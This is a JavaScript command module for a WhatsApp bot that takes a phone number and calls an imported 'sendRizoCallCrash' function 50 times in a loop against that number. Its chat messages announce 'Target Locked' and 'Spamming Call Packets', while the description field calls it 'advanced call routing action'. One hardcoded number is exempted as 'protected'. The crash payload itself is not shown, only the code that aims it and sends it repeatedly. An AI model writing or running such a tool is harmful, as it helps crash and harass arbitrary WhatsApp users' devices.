const { sendRizoCallCrash, callSleep } = require('../lib/rizo-call');

module.exports = {
  name: "rizocall",
  commands: ['rizocall', 'rzcall', 'callcrash'],
  category: "owner",
  description: "Trigger advanced call routing action",
  async execute(sock, m, args) {
    if (!args[0]) {
      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizocall 923xx` }, { quoted: m });
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
    }

    let target = pepec + '@s.whatsapp.net';
    await sock.sendMessage(m.chat, { text: `📞 *RIZO Call Target Locked:* ${pepec}\n⚡ *Spamming Call Packets...*` }, { quoted: m });

    try {
      for (let i = 0; i < 50; i++) {
        await sendRizoCallCrash(sock, target);
        await callSleep(1000);
      }
      await sock.sendMessage(m.chat, { react: { text: "📞", key: m.key } });
    } catch (error) {
      await sock.sendMessage(m.chat, { text: "⚠️ Error: Call payload execute karne mein masla aaya hai." }, { quoted: m });
    }
  }
};
